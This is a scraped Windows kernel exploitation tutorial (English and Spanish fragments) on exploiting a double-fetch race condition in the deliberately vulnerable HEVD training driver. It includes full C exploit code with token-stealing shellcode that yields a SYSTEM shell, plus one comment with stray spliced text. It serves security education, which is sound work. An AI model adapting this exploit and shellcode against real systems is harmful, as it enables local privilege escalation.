Exploit(HANDLE hHEVD) { LPVOID lpvMemoryAllocation = NULL; HANDLE hThreadWork[NUM_THREADS] = { 0 }; HANDLE hThreadRace[NUM_THREADS] = { 0 }; PIRP_ARGS pIrpArgs = (PIRP_ARGS)malloc(sizeof(IRP_ARGS)); PDOUBLE_FETCH pDoubleFetchObject = (PDOUBLE_FETCH)malloc(sizeof(DOUBLE_FETCH)); lpvMemoryAllocation = VirtualAlloc(NULL, BUFFER, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE); /* Fill up the buffer */ printf(\u0026#34;[*] Successfully allocated exploitation buffer\\n\u0026#34;); if (GenerateExploitBuffer(lpvMemoryAllocation) == -1) { return -1; } /* Setup the Double Fetch object */ pDoubleFetchObject-\u0026gt;Buffer = lpvMemoryAllocation; pDoubleFetchObject-\u0026gt;Size = 0; /* Setup the base IRP argument(s) */ pIrpArgs-\u0026gt;hHEVD = hHEVD; pIrpArgs-\u0026gt;pDoubleFetch = pDoubleFetchObject; /* Start the race!! */ printf(\u0026#34;[*] Off to the races\\n\u0026#34;); for (int i = 0; i \u0026lt; NUM_THREADS; i++) { hThreadWork[i] = CreateThread(NULL, 0, TriggerWorkingCondition, pIrpArgs, 0, NULL); hThreadRace[i] = CreateThread(NULL, 0, TriggerRaceCondition, pIrpArgs, 0, NULL); } WaitForMultipleObjects(NUM_THREADS, hThreadWork, TRUE, 1000); for (int i = 0; i \u0026lt; NUM_THREADS; i++) { TerminateThread(hThreadWork[i], 0); CloseHandle(hThreadWork[i]); TerminateThread(hThreadRace[i], 0); CloseHandle(hThreadRace[i]); } return CheckWin(); } int main() { HANDLE hHEVD = NULL; hHEVD = CreateFileA(\u0026#34;\\\\\\\\.\\\\HackSysExtremeVulnerableDriver\u0026#34;, (GENERIC_READ | GENERIC_WRITE), 0x00, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); if (hHEVD == NULL) { printf(\u0026#34;[-] Failed to get a handle on HackSysExtremeVulnerableDriver\\n\u0026#34;); return -1; } if (Exploit(hHEVD) == 0) { printf(\u0026#34;[*] Exploitation successful, enjoy de shell!!\\n\\n\u0026#34;); system(\u0026#34;cmd.exe\u0026#34;); } else { printf(\u0026#34;[-] Exploitation failed, run again\\n\u0026#34;); } if (hHEVD != INVALID_HANDLE_VALUE) { CloseHandle(hHEVD); } } Una vez enviado, podemos ver que hemos explotado el Double Fetch (Race Condition)!\nRecursos # https://www.kn0sky.com/?p=194 ","date":"26 January 2025","externalUrl":null,"permalink":"/posts/0x07-introducci%C3%B3n-a-windows-kernel-race-conditions/","section":"Posts","summary":"","title":"0x07 - Introducción a Windows Kernel Race Conditions","type":"posts"},{"content":" ₍₍ (ง ˙ω˙)ว ⁾⁾ Hablas Español? Empújame! In the last tutorial we successfully exploited a Type Confusion vulnerability against Windows 11 (x64). In this tutorial we\u0026rsquo;ll introduce a new vulnerability type - a Race Condition, more specifically a double fetch!\nAs with the previous tutorials, the introduction to this vulnerability type will be done within Windows 7 (x86).\nTable of Contents # What is a Race Condition (High Level) Using the Source DoubleFetchIoctlHandler TriggerDoubleFetch Theory Crafting a PoC Exploitation Sources What is a Race Condition (High Level) # Race Conditions are one of the most complex and powerful vulnerability types an attacker can exploit on any system or application. It feels like just yesterday when Dirty Cow was released to the public - a local privilege escalation vulnerability that affected ALL Linux based operating systems that used older versions of the Linux Kernel.\nIn all honesty before taking the RET2 Wargames course these vulnerability types, even at a high level seemed completely unapproachable. That said I will try my best to give a good overview of what causes these types of vulnerabilities. However, should you walk away from this tutorial completely confused or wanting more exposure to race conditions I heavily recommend RET2 Wargames.\nWith that said, let\u0026rsquo;s jump into a high-level overview.\nFor our non-technical example, we\u0026rsquo;ll be looking at a game you may be familiar with called Overcooked. In this game you and your friends are responsible for cooking meals and since there\u0026rsquo;s time limits you often have to work together to get orders completed quickly. You can imagine how intense this can get\u0026hellip;\nYou and your friends are often tossing ingredients into the same container, this could be a pot, plate, or even a smoothie cup.\nShown in the image below, multiple players are making soups:\nWithin this image we see that two soups are being made an onion soup and a tomato soup. We also see four players:\nA clown A axolotl A parrot A lady Let\u0026rsquo;s say the axolotl player is a bit of a troll and likes to cause chaos. We see the axolotl holding an onion and we see the parrot cutting a tomato. Additionally we see the clown holding a tomato.\nTo meet the order the second soup currently needs one tomato.\nBoth the axolotl and the parrot wish to toss their ingredients into the pot however each ingredient will have a very different outcome.\nIf the tomato makes it into the pot - the team will successfully place the order If the onion makes it into the pot - the team will have to toss the soup and start over potentially missing the order The axolotl knows that the team each has a respective role, however the axolotl is searching for a vulnerability in the way the food is being prepared in order to exploit it (race condition). Being that the next two soups are onion the axolotl tells the parrot to cut his onion.\nSince all players are trying to make the orders at the same time a window of opportunity presents itself to the axolotl. If the parrot is reading the orders and reading what the pot needs he may be too slow to notice what the axolotl is planning to do (or rather toss into the pot).\nThe axolotl decides to exploit this and successfully tampers the soup\u0026hellip;\nWhat does this have to do with race conditions?\nYou can think of each player as a thread. These threads are all working in parallel, affecting a shared resource (the pot). The race condition in this example occurs when two \u0026ldquo;threads\u0026rdquo; (players) try to modify the shared resource at the same time; what ingredient gets tossed into the pot determines the outcome. If the onion goes in, it’s a successful exploitation by the axolotl. In technical terms, a race condition happens when two or more concurrent processes or threads attempt to modify or access shared resources simultaneously, leading to unpredictable or unintended consequences.\nWhat if multiple threads are responsible for frees? What if multiple threads are responsible for allocations? What if multiple threads decide what path an application takes? As you can imagine the limits to race conditions are endless.\nHopefully that made sense! Let\u0026rsquo;s get started!\nUsing the Source # First we need to identify the target files for this vulnerability.\n$ ls -l | grep Double -rw-r--r-- 1 wetw0rk wetw0rk 5801 Nov 18 12:32 DoubleFetch.c -rw-r--r-- 1 wetw0rk wetw0rk 2408 Nov 18 12:32 DoubleFetch.h The source tells us that we\u0026rsquo;re gonna be dealing with the following structures and calls:\n// DoubleFetch.h 62 typedef struct _DOUBLE_FETCH 63 { 64 PVOID Buffer; 65 SIZE_T Size; 66 } DOUBLE_FETCH, *PDOUBLE_FETCH; // DoubleFetch.c DoubleFetchIoctlHandler() TriggerDoubleFetch() DoubleFetchIoctlHandler # Within this handler, we can see that our input is casted into a structure pointer for the custom type _DOUBLE_FETCH. From there our casted input is sent to the TriggerDoubleFetch() function.\n156 NTSTATUS 157 DoubleFetchIoctlHandler( 158 _In_ PIRP Irp, 159 _In_ PIO_STACK_LOCATION IrpSp 160 ) 161 { 162 PDOUBLE_FETCH UserDoubleFetch = NULL; 163 NTSTATUS Status = STATUS_UNSUCCESSFUL; 164 165 UNREFERENCED_PARAMETER(Irp); 166 PAGED_CODE(); 167 168 UserDoubleFetch = (PDOUBLE_FETCH)IrpSp-\u0026gt;Parameters.DeviceIoControl.Type3InputBuffer; 169 170 if (UserDoubleFetch) 171 { 172 Status = TriggerDoubleFetch(UserDoubleFetch); 173 } 174 175 return Status; 176 } TriggerDoubleFetch # TriggerDoubleFetch is where we start to see a more \u0026ldquo;complex\u0026rdquo; operation.\n63 __declspec(safebuffers) 64 NTSTATUS 65 TriggerDoubleFetch( 66 _In_ PDOUBLE_FETCH UserDoubleFetch 67 ) 68 { 69 NTSTATUS Status = STATUS_SUCCESS; 70 ULONG KernelBuffer[BUFFER_SIZE] = { 0 }; 71 72 #ifdef SECURE 73 PVOID UserBuffer = NULL; 74 SIZE_T UserBufferSize = 0; 75 #endif 76 77 PAGED_CODE(); 78 79 __try 80 { 81 // 82 // Verify if the buffer resides in user mode 83 // 84 85 ProbeForRead(UserDoubleFetch, sizeof(DOUBLE_FETCH), (ULONG)__alignof(UCHAR)); 86 87 DbgPrint(\u0026#34;[+] UserDoubleFetch: 0x%p\\n\u0026#34;, UserDoubleFetch); 88 DbgPrint(\u0026#34;[+] KernelBuffer: 0x%p\\n\u0026#34;, \u0026amp;KernelBuffer); 89 DbgPrint(\u0026#34;[+] KernelBuffer Size: 0x%X\\n\u0026#34;, sizeof(KernelBuffer)); 90 91 #ifdef SECURE 92 UserBuffer = UserDoubleFetch-\u0026gt;Buffer; 93 UserBufferSize = UserDoubleFetch-\u0026gt;Size; 94 95 DbgPrint(\u0026#34;[+] UserDoubleFetch-\u0026gt;Buffer: 0x%p\\n\u0026#34;, UserBuffer); 96 DbgPrint(\u0026#34;[+] UserDoubleFetch-\u0026gt;Size: 0x%X\\n\u0026#34;, UserBufferSize); 97 98 if (UserBufferSize \u0026gt; sizeof(KernelBuffer)) 99 { 100 DbgPrint(\u0026#34;[-] Invalid Buffer Size: 0x%X\\n\u0026#34;, UserBufferSize); 101 102 Status = STATUS_INVALID_PARAMETER; 103 return Status; 104 } 105 106 // 107 // Secure Note: This is secure because the developer is fetching 108 // \u0026#39;UserDoubleFetch-\u0026gt;Buffer\u0026#39; and \u0026#39;UserDoubleFetch-\u0026gt;Size\u0026#39; from user 109 // mode just once and storing it in a temporary variable. Later, this 110 // stored values are passed to RtlCopyMemory()/memcpy(). Hence, there 111 // will be no race condition 112 // 113 114 RtlCopyMemory((PVOID)KernelBuffer, UserBuffer, UserBufferSize); 115 #else 116 DbgPrint(\u0026#34;[+] UserDoubleFetch-\u0026gt;Buffer: 0x%p\\n\u0026#34;, UserDoubleFetch-\u0026gt;Buffer); 117 DbgPrint(\u0026#34;[+] UserDoubleFetch-\u0026gt;Size: 0x%X\\n\u0026#34;, UserDoubleFetch-\u0026gt;Size); 118 119 if (UserDoubleFetch-\u0026gt;Size \u0026gt; sizeof(KernelBuffer)) 120 { 121 DbgPrint(\u0026#34;[-] Invalid Buffer Size: 0x%X\\n\u0026#34;, UserDoubleFetch-\u0026gt;Size); 122 123 Status = STATUS_INVALID_PARAMETER; 124 return Status; 125 } 126 127 DbgPrint(\u0026#34;[+] Triggering Double Fetch\\n\u0026#34;); 128 129 // 130 // Vulnerability Note: This is a vanilla Double Fetch vulnerability because the 131 // developer is fetching \u0026#39;UserDoubleFetch-\u0026gt;Buffer\u0026#39; and \u0026#39;UserDoubleFetch-\u0026gt;Size\u0026#39; 132 // from user mode twice and the double fetched values are passed to RtlCopyMemory()/memcpy(). 133 // This creates a race condition and the size check could be bypassed which will later 134 // cause stack based buffer overflow 135 // 136 137 RtlCopyMemory((PVOID)KernelBuffer, UserDoubleFetch-\u0026gt;Buffer, UserDoubleFetch-\u0026gt;Size); 138 #endif 139 } 140 __except (EXCEPTION_EXECUTE_HANDLER) 141 { 142 Status = GetExceptionCode(); 143 DbgPrint(\u0026#34;[-] Exception Code: 0x%X\\n\u0026#34;, Status); 144 } 145 146 return Status; 147 } Let\u0026rsquo;s break this down.\nStarting on lines 63-90 we see that a buffer with a total size of 512 bytes is being used for KernelBuffer (this size can be obtained from BUFFER_SIZE definition in Common.h).\n63 __declspec(safebuffers) 64 NTSTATUS 65 TriggerDoubleFetch( 66 _In_ PDOUBLE_FETCH UserDoubleFetch 67 ) 68 { 69 NTSTATUS Status = STATUS_SUCCESS; 70 ULONG KernelBuffer[BUFFER_SIZE] = { 0 }; 71 72 #ifdef SECURE 73 PVOID UserBuffer = NULL; 74 SIZE_T UserBufferSize = 0; 75 #endif 76 77 PAGED_CODE(); 78 79 __try 80 { 81 // 82 // Verify if the buffer resides in user mode 83 // 84 85 ProbeForRead(UserDoubleFetch, sizeof(DOUBLE_FETCH), (ULONG)__alignof(UCHAR)); 86 87 DbgPrint(\u0026#34;[+] UserDoubleFetch: 0x%p\\n\u0026#34;, UserDoubleFetch); 88 DbgPrint(\u0026#34;[+] KernelBuffer: 0x%p\\n\u0026#34;, \u0026amp;KernelBuffer); 89 DbgPrint(\u0026#34;[+] KernelBuffer Size: 0x%X\\n\u0026#34;, sizeof(KernelBuffer)); 90 91 #ifdef SECURE 92 UserBuffer = UserDoubleFetch-\u0026gt;Buffer; 93 UserBufferSize = UserDoubleFetch-\u0026gt;Size; 94 95 DbgPrint(\u0026#34;[+] UserDoubleFetch-\u0026gt;Buffer: 0x%p\\n\u0026#34;, UserBuffer); 96 DbgPrint(\u0026#34;[+] UserDoubleFetch-\u0026gt;Size: 0x%X\\n\u0026#34;, UserBufferSize); 97 98 if (UserBufferSize \u0026gt; sizeof(KernelBuffer)) 99 { 100 DbgPrint(\u0026#34;[-] Invalid Buffer Size: 0x%X\\n\u0026#34;, UserBufferSize); 101 102 Status = STATUS_INVALID_PARAMETER; 103 return Status; 104 } 105 106 // 107 // Secure Note: This is secure because the developer is fetching 108 // \u0026#39;UserDoubleFetch-\u0026gt;Buffer\u0026#39; and \u0026#39;UserDoubleFetch-\u0026gt;Size\u0026#39; from user 109 // mode just once and storing it in a temporary variable. Later, this 110 // stored values are passed to RtlCopyMemory()/memcpy(). Hence, there 111 // will be no race condition 112 // 113 114 RtlCopyMemory((PVOID)KernelBuffer, UserBuffer, UserBufferSize); Lines 115-147 we start to see the vulnerability. We can see that if the size of the Size member of the _DOUBLE_FETCH structure is greater than the sizeof(KernelBuffer) the driver will return.\nOtherwise we reach the RtlCopyMemory() function call.\n115 #else 116 DbgPrint(\u0026#34;[+] UserDoubleFetch-\u0026gt;Buffer: 0x%p\\n\u0026#34;, UserDoubleFetch-\u0026gt;Buffer); 117 DbgPrint(\u0026#34;[+] UserDoubleFetch-\u0026gt;Size: 0x%X\\n\u0026#34;, UserDoubleFetch-\u0026gt;Size); 118 119 if (UserDoubleFetch-\u0026gt;Size \u0026gt; sizeof(KernelBuffer)) 120 { 121 DbgPrint(\u0026#34;[-] Invalid Buffer Size: 0x%X\\n\u0026#34;, UserDoubleFetch-\u0026gt;Size); 122 123 Status = STATUS_INVALID_PARAMETER; 124 return Status; 125 } 126 127 DbgPrint(\u0026#34;[+] Triggering Double Fetch\\n\u0026#34;); 128 129 // 130 // Vulnerability Note: This is a vanilla Double Fetch vulnerability because the 131 // developer is fetching \u0026#39;UserDoubleFetch-\u0026gt;Buffer\u0026#39; and \u0026#39;UserDoubleFetch-\u0026gt;Size\u0026#39; 132 // from user mode twice and the double fetched values are passed to RtlCopyMemory()/memcpy(). 133 // This creates a race condition and the size check could be bypassed which will later 134 // cause stack based buffer overflow 135 // 136 137 RtlCopyMemory((PVOID)KernelBuffer, UserDoubleFetch-\u0026gt;Buffer, UserDoubleFetch-\u0026gt;Size); 138 #endif 139 } 140 __except (EXCEPTION_EXECUTE_HANDLER) 141 { 142 Status = GetExceptionCode(); 143 DbgPrint(\u0026#34;[-] Exception Code: 0x%X\\n\u0026#34;, Status); 144 } 145 146 return Status; 147 } Theory # Looking at the structure we can just pass a pointer to a large buffer and set the size to something small? Of course we have to do this at just the right moment\u0026hellip;\nPehaps we can send something like this:\n+-----------+---------------------------------+ | Thread #1 | Spam DOUBLE_FETCH.Size (0x10) | +-----------+---------------------------------+ | Thread #2 | Spam DOUBLE_FETCH.Size (0x1000) | +-----------+---------------------------------+ Crafting a PoC # With a solid attack plan in place we can start crafting a PoC as shown below.\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;windows.h\u0026gt; #include \u0026lt;psapi.h\u0026gt; #include \u0026lt;ntdef.h\u0026gt; #include \u0026lt;winternl.h\u0026gt; #include \u0026lt;shlwapi.h\u0026gt; #include \u0026lt;processthreadsapi.h\u0026gt; #define IOCTL(Function) CTL_CODE (FILE_DEVICE_UNKNOWN, Function, METHOD_NEITHER, FILE_ANY_ACCESS) #define HEVD_IOCTL_DOUBLE_FETCH IOCTL(0x80D) /* Structure used by Double Fetch */ typedef struct _DOUBLE_FETCH { PVOID Buffer; SIZE_T Size; } DOUBLE_FETCH, *PDOUBLE_FETCH; /* Structure for threads */ typedef struct _IRP_ARGS { HANDLE hHEVD; PDOUBLE_FETCH pDoubleFetch; } IRP_ARGS, *PIRP_ARGS; /* Max threads */ #define NUM_THREADS 5 /* Exploit Buffer */ #define BUFFER 0x1000 /* CheckWin(): Simple function to check if we\u0026#39;re running as SYSTEM */ int CheckWin(VOID) { DWORD win = 0; DWORD dwLen = 0; CHAR *cUsername = NULL; GetUserNameA(NULL, \u0026amp;dwLen); if (dwLen \u0026gt; 0) { cUsername = (CHAR *)malloc(dwLen * sizeof(CHAR)); } else { printf(\u0026#34;[-] Failed to allocate buffer for username check\\n\u0026#34;); return -1; } GetUserNameA(cUsername, \u0026amp;dwLen); win = strcmp(cUsername, \u0026#34;SYSTEM\u0026#34;); free(cUsername); return (win == 0) ? win : -1; } /* TriggerRaceCondition(): Since driver reads from userland twice we can overwrite the existing condition that bypasses the checkslmgr -rearm at runtime. If we win the race we successfully trigger a buffer overflow! */ DWORD WINAPI TriggerRaceCondition(LPVOID lpParameters) { PIRP_ARGS pIrpArgs = (PIRP_ARGS)lpParameters; while (1) { pIrpArgs-\u0026gt;pDoubleFetch-\u0026gt;Size = BUFFER; } return 0; } /* TriggerWorkingCondition(): As we saw in TriggerDoubleFetch() in order to reach the RtlCopyMemory() aka wrapper for memcpy() we need our buffer to be under the sizeof(KernelBuffer). This function sends an IOCTL to ensure we meed that condition. */ DWORD WINAPI TriggerWorkingCondition(LPVOID lpParameters) { DWORD dwBytesReturned = 0; PIRP_ARGS pIrpArgs = (PIRP_ARGS)lpParameters; printf(\u0026#34;\\t[*] Spraying DoubleFetchObject(s): %p, Size: 0x%x\\n\u0026#34;, pIrpArgs-\u0026gt;pDoubleFetch, pIrpArgs-\u0026gt;pDoubleFetch-\u0026gt;Size); while (1) { pIrpArgs-\u0026gt;pDoubleFetch-\u0026gt;Size = 0x10; DeviceIoControl(pIrpArgs-\u0026gt;hHEVD, HEVD_IOCTL_DOUBLE_FETCH, pIrpArgs-\u0026gt;pDoubleFetch, sizeof(DOUBLE_FETCH), NULL, 0x00, \u0026amp;dwBytesReturned, NULL); } return 0; } /* GenerateExploitBuffer(): Generate the buffer that will overwrite the return address and grant control over the instruction pointer. */ void GenerateExploitBuffer(LPVOID lpvBuffer) { uint32_t *payload = (uint32_t *)(lpvBuffer); for (int i = 0; i \u0026lt; (BUFFER / sizeof(uint32_t)); i++) { *payload++ = 0x41414141; } } /* Exploit(): Double Fetch */ int Exploit(HANDLE hHEVD) { LPVOID lpvMemoryAllocation = NULL; HANDLE hThreadWork[NUM_THREADS] = { 0 }; HANDLE hThreadRace[NUM_THREADS] = { 0 }; PIRP_ARGS pIrpArgs = (PIRP_ARGS)malloc(sizeof(IRP_ARGS)); PDOUBLE_FETCH pDoubleFetchObject = (PDOUBLE_FETCH)malloc(sizeof(DOUBLE_FETCH)); lpvMemoryAllocation = VirtualAlloc(NULL, BUFFER, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE); /* Fill up the buffer */ GenerateExploitBuffer(lpvMemoryAllocation); /* Setup the Double Fetch object */ pDoubleFetchObject-\u0026gt;Buffer = lpvMemoryAllocation; pDoubleFetchObject-\u0026gt;Size = 0; /* Setup the base IRP argument(s) */ pIrpArgs-\u0026gt;hHEVD = hHEVD; pIrpArgs-\u0026gt;pDoubleFetch = pDoubleFetchObject; /* Start the race!! */ printf(\u0026#34;[*] Off to the races\\n\u0026#34;); for (int i = 0; i \u0026lt; NUM_THREADS; i++) { hThreadWork[i] = CreateThread(NULL, 0, TriggerWorkingCondition, pIrpArgs, 0, NULL); hThreadRace[i] = CreateThread(NULL, 0, TriggerRaceCondition, pIrpArgs, 0, NULL); } WaitForMultipleObjects(NUM_THREADS, hThreadWork, TRUE, 10000); for (int i = 0; i \u0026lt; NUM_THREADS; i++) { TerminateThread(hThreadWork[i], 0); CloseHandle(hThreadWork[i]); TerminateThread(hThreadRace[i], 0); CloseHandle(hThreadRace[i]); } return CheckWin(); } int main() { HANDLE hHEVD = NULL; hHEVD = CreateFileA(\u0026#34;\\\\\\\\.\\\\HackSysExtremeVulnerableDriver\u0026#34;, (GENERIC_READ | GENERIC_WRITE), 0x00, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); if (hHEVD == NULL) { printf(\u0026#34;[-] Failed to get a handle on HackSysExtremeVulnerableDriver\\n\u0026#34;); return -1; } if (Exploit(hHEVD) == 0) { printf(\u0026#34;[*] Exploitation successful, enjoy de shell!!\\n\\n\u0026#34;); system(\u0026#34;cmd.exe\u0026#34;); } else { printf(\u0026#34;[-] Exploitation failed, run again\\n\u0026#34;); } if (hHEVD != INVALID_HANDLE_VALUE) { CloseHandle(hHEVD); } } Once the buffer is sent the following crash occurs:\nIf we !analyze -v the crash, we see the following:\nFrom my experience with HEVD this normally means our buffer is so large we corrupted data that allows us a clean return address overwrite. So the solution here is to send a smaller buffer. In honor of 2600 I decided to send 2600 bytes!\nOnce sent, we have control over the instruction pointer!\nExploitation # After playing with offsets I developed the following code:\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;windows.h\u0026gt; #include \u0026lt;psapi.h\u0026gt; #include \u0026lt;ntdef.h\u0026gt; #include \u0026lt;winternl.h\u0026gt; #include \u0026lt;shlwapi.h\u0026gt; #include \u0026lt;processthreadsapi.h\u0026gt; #define IOCTL(Function) CTL_CODE (FILE_DEVICE_UNKNOWN, Function, METHOD_NEITHER, FILE_ANY_ACCESS) #define HEVD_IOCTL_DOUBLE_FETCH IOCTL(0x80D) /* Structure used by Double Fetch */ typedef struct _DOUBLE_FETCH { PVOID Buffer; SIZE_T Size; } DOUBLE_FETCH, *PDOUBLE_FETCH; /* Structure for threads */ typedef struct _IRP_ARGS { HANDLE hHEVD; PDOUBLE_FETCH pDoubleFetch; } IRP_ARGS, *PIRP_ARGS; /* Max threads */ #define NUM_THREADS 5 /* Exploit Buffer */ #define BUFFER 2084 /* CheckWin(): Simple function to check if we\u0026#39;re running as SYSTEM */ int CheckWin(VOID) { DWORD win = 0; DWORD dwLen = 0; CHAR *cUsername = NULL; GetUserNameA(NULL, \u0026amp;dwLen); if (dwLen \u0026gt; 0) { cUsername = (CHAR *)malloc(dwLen * sizeof(CHAR)); } else { printf(\u0026#34;[-] Failed to allocate buffer for username check\\n\u0026#34;); return -1; } GetUserNameA(cUsername, \u0026amp;dwLen); win = strcmp(cUsername, \u0026#34;SYSTEM\u0026#34;); free(cUsername); return (win == 0) ? win : -1; } /* TriggerRaceCondition(): Since driver reads from userland twice we can overwrite the existing condition that bypasses the check at runtime. If we win the race we successfully trigger a buffer overflow! */ DWORD WINAPI TriggerRaceCondition(LPVOID lpParameters) { PIRP_ARGS pIrpArgs = (PIRP_ARGS)lpParameters; while (1) { pIrpArgs-\u0026gt;pDoubleFetch-\u0026gt;Size = BUFFER; } return 0; } /* TriggerWorkingCondition(): As we saw in TriggerDoubleFetch() in order to reach the RtlCopyMemory() aka wrapper for memcpy() we need our buffer to be under the sizeof(KernelBuffer). This function sends an IOCTL to ensure we meed that condition. */ DWORD WINAPI TriggerWorkingCondition(LPVOID lpParameters) { DWORD dwBytesReturned = 0; PIRP_ARGS pIrpArgs = (PIRP_ARGS)lpParameters; printf(\u0026#34;\\t[*] Spraying DoubleFetchObject(s): %p, Size: 0x%x\\n\u0026#34;, pIrpArgs-\u0026gt;pDoubleFetch, pIrpArgs-\u0026gt;pDoubleFetch-\u0026gt;Size); while (1) { pIrpArgs-\u0026gt;pDoubleFetch-\u0026gt;Size = 0x10; DeviceIoControl(pIrpArgs-\u0026gt;hHEVD, HEVD_IOCTL_DOUBLE_FETCH, pIrpArgs-\u0026gt;pDoubleFetch, sizeof(DOUBLE_FETCH), NULL, 0x00, \u0026amp;dwBytesReturned, NULL); } return 0; } /* GenerateExploitBuffer(): Generate the buffer that will overwrite the return address and grant control over the instruction pointer. */ DWORD GenerateExploitBuffer(LPVOID lpvBuffer) { uint32_t *payload = (uint32_t *)(lpvBuffer); LPVOID lpvShellcode = NULL; char shellcode[]= // sickle-tool -p windows/x86/kernel_token_stealer -f c -m pinpoint \u0026#34;\\x60\u0026#34; // pushal \u0026#34;\\x31\\xc0\u0026#34; // xor eax, eax \u0026#34;\\x64\\x8b\\x80\\x24\\x01\\x00\\x00\u0026#34; // mov eax, dword ptr fs:[eax + 0x124] \u0026#34;\\x8b\\x40\\x50\u0026#34; // mov eax, dword ptr [eax + 0x50] \u0026#34;\\x89\\xc1\u0026#34; // mov ecx, eax \u0026#34;\\xba\\x04\\x00\\x00\\x00\u0026#34; // mov edx, 4 \u0026#34;\\x8b\\x80\\xb8\\x00\\x00\\x00\u0026#34; // mov eax, dword ptr [eax + 0xb8] \u0026#34;\\x2d\\xb8\\x00\\x00\\x00\u0026#34; // sub eax, 0xb8 \u0026#34;\\x39\\x90\\xb4\\x00\\x00\\x00\u0026#34; // cmp dword ptr [eax + 0xb4], edx \u0026#34;\\x75\\xed\u0026#34; // jne 0x1014 \u0026#34;\\x8b\\x90\\xf8\\x00\\x00\\x00\u0026#34; // mov edx, dword ptr [eax + 0xf8] \u0026#34;\\x89\\x91\\xf8\\x00\\x00\\x00\u0026#34; // mov dword ptr [ecx + 0xf8], edx \u0026#34;\\x61\u0026#34; // popal /* RETURN CODE */ \u0026#34;\\x5d\u0026#34; // POP EBP \u0026#34;\\xc2\\x08\\x00\u0026#34;; // RET 0x08 lpvShellcode = VirtualAlloc(NULL, 57, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE); if (lpvShellcode == NULL) { printf(\u0026#34;[-] Failed to generate shellcode allocation\\n\u0026#34;); return -1; } printf(\u0026#34;[*] Copying shellcode to allocated memory region\\n\u0026#34;); memcpy(lpvShellcode, shellcode, 57); for (int i = 0; i \u0026lt; (BUFFER / sizeof(uint32_t)); i++) { *payload++ = (uint32_t)lpvShellcode; } return 0; } /* Exploit(): Double Fetch */ DWORD Exploit(HANDLE hHEVD) { LPVOID lpvMemoryAllocation = NULL; HANDLE hThreadWork[NUM_THREADS] = { 0 }; HANDLE hThreadRace[NUM_THREADS] = { 0 }; PIRP_ARGS pIrpArgs = (PIRP_ARGS)malloc(sizeof(IRP_ARGS)); PDOUBLE_FETCH pDoubleFetchObject = (PDOUBLE_FETCH)malloc(sizeof(DOUBLE_FETCH)); lpvMemoryAllocation = VirtualAlloc(NULL, BUFFER, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE); /* Fill up the buffer */ printf(\u0026#34;[*] Successfully allocated exploitation buffer\\n\u0026#34;); if (GenerateExploitBuffer(lpvMemoryAllocation) == -1) { return -1; } /* Setup the Double Fetch object */ pDoubleFetchObject-\u0026gt;Buffer = lpvMemoryAllocation; pDoubleFetchObject-\u0026gt;Size = 0; /* Setup the base IRP argument(s) */ pIrpArgs-\u0026gt;hHEVD = hHEVD; pIrpArgs-\u0026gt;pDoubleFetch = pDoubleFetchObject; /* Start the race!! */ printf(\u0026#34;[*] Off to the races\\n\u0026#34;); for (int i = 0; i \u0026lt; NUM_THREADS; i++) { hThreadWork[i] = CreateThread(NULL, 0, TriggerWorkingCondition, pIrpArgs, 0, NULL); hThreadRace[i] = CreateThread(NULL, 0, TriggerRaceCondition, pIrpArgs, 0, NULL); } WaitForMultipleObjects(NUM_THREADS, hThreadWork, TRUE, 1000); for (int i = 0; i \u0026lt; NUM_THREADS; i++) { TerminateThread(hThreadWork[i], 0); CloseHandle(hThreadWork[i]); TerminateThread(hThreadRace[i], 0); CloseHandle(hThreadRace[i]); } return CheckWin(); } int main() { HANDLE hHEVD = NULL; hHEVD = CreateFileA(\u0026#34;\\\\\\\\.\\\\HackSysExtremeVulnerableDriver\u0026#34;, (GENERIC_READ | GENERIC_WRITE), 0x00, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); if (hHEVD == NULL) { printf(\u0026#34;[-] Failed to get a handle on HackSysExtremeVulnerableDriver\\n\u0026#34;); return -1; } if (Exploit(hHEVD) == 0) { printf(\u0026#34;[*] Exploitation successful, enjoy de shell!!\\n\\n\u0026#34;); system(\u0026#34;cmd.exe\u0026#34;); } else { printf(\u0026#34;[-] Exploitation failed, run again\\n\u0026#34;); } if (hHEVD != INVALID_HANDLE_VALUE) { CloseHandle(hHEVD); } } Once sent, we can see that we\u0026rsquo;ve successfully exploited the double fetch (Race Condition)!\nSources # https://www.kn0sky.com/?p=194 ","date":"25 January 2025","externalUrl":null,"permalink":"/posts/0x07-introduction-to-windows-kernel-race-conditions/","section":"Posts","summary":"","title":"0x07 - Introduction to Windows Kernel Race Conditions","type":"posts"},{"content":"En el último tutorial explotamos una \u0026ldquo;Type Confusion\u0026rdquo; dentro del kernel de Windows 7 (x86). Habiendo obtenido un base sólido para esta vulnerabilidad, podemos proceder a intentar aprovechalo dentro de Windows 11 (x64).\nTable of Contents # Ingeniería Inversa Escribiendo el Exploit Plan de Ataque El Comienzo de Sufrimiento Teoría Operaciones Generales de Memoria Memoria Virtual Sumario de Memoria Paginada Probando la Teoría Explotación Recursos Ingeniería Inversa # Veamos el controlador vulnerable y las estructuras respectivas.\nNo podemos ignorar que tenemos mucha información sobre cómo funciona esta vulnerabilidad. La única diferencia que debemos tener en cuenta es la asignación de memoria, que será de 16 (0x10) bytes. Esto es por el tamaño de un \u0026ldquo;unisigned long\u0026rdquo; en la arquitectura de x64.\nDicho esto podemos empezar a escribir el PoC.\nEscribiendo el Exploit # Abajo esta el PoC para empezar a trabajar.\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;windows.h\u0026gt; #include \u0026lt;psapi.h\u0026gt; #include \u0026lt;ntdef.h\u0026gt; #include \u0026lt;winternl.h\u0026gt; #include \u0026lt;shlwapi.h\u0026gt; #define TYPE_CONFUSION 0x222023 /* Structure used by Type Confusion */ typedef struct 